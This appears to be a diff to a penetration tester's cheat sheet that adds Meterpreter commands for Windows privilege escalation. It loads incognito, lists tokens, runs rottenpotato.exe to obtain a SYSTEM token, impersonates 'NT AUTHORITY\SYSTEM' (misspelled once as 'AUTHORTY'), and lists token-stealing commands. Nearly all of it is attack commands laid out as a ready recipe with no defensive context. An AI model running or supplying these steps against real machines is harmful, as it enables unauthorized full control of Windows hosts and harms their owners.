@@ -1,6 +1,27 @@
-
+------------------------------------------------------------------------------------------
 
 # on meterpreter session
 > getuid
 > load incognito
-> lis
+> list_tokens -u
+
+# list_tokens -g command can also be used
+
+# the token for the “NT Authority\System” account would become available
+> execute -f rottenpotato.exe -cH
+
+# check if nt authority\system token is now available
+list_tokens -g
+
+# impersonate token
+impersonate_token "NT AUTHORTY\\SYSTEM"
+
+# now check the user again
+> getuid
+
+# other useful commands of incognito
+steal_token PID
+drop_token
+rev2self
+
+------------------------------------------------------------------------------------------
